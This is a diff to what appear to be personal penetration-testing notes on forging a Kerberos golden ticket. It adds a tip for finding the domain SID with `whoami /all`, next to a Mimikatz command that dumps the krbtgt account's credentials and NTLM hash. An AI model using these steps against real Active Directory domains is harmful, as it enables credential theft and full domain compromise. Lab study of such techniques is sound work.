@@ -16,6 +16,7 @@
 	- `lsadump::lsa /inject /name:krbtgt`
 - Copy the following:
 	- SID of the Domain : `S-1-5-21-76944399-951576941-787082915`
+		- Get SID using: `whoami /all`(everything except last -/d{3} which refers to user)
 		- ![[Pasted image 20250330155051.png]]
 	- NTLM hash of `krbtgt` account:
 		- ![[Pasted image 20250330155128.png]]
